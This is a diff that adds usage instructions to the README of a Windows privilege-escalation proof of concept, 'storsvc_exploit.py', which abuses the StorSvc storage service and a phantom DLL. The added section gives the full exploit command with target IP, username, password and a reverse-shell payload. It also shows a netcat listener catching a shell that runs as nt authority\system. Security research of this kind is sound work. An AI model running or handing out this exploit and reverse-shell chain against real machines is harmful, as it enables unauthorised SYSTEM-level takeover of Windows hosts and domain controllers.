@@ -1,3 +1,35 @@
+# Using storsvc_exploit.py
+
+On a Windows10 or Windows11 machine we do not need StoragePool as StorageSpace already exists by default. 
+
+We are doing skip-setup as this was made to setup a share and setup the %PATH%, if you cannot write to a %PATH% this exploit will not work for a reverse shell as it is using a phantom DLL
+
+```
+python3 /home/kali/dll-research/poc/storsvc_exploit.py \
+  -t 192.168.15.239 \
+  -u yager \
+  -p 'P@ssw0rd!' \
+  --payload reverse \
+  --lhost 192.168.15.157 \
+  --lport 443 \
+  --skip-setup
+```
+
+With a listener listening on port 443:
+
+```
+rlwrap nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.15.157] from (UNKNOWN) [192.168.15.239] 58319
+Microsoft Windows [Version 10.0.26100.8457]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\System32>whoami
+whoami
+nt authority\system
+```
+
+
 # StorSvc-Impersonation-Bypass
 
 An authenticated domain user can trigger SYSTEM-level DeleteFileW and CreateDirectoryW on the DC. The file path is derived from the tier entry's path field (populated by the StorageManager) with the hardcoded suffix "WindowsApps" appended.
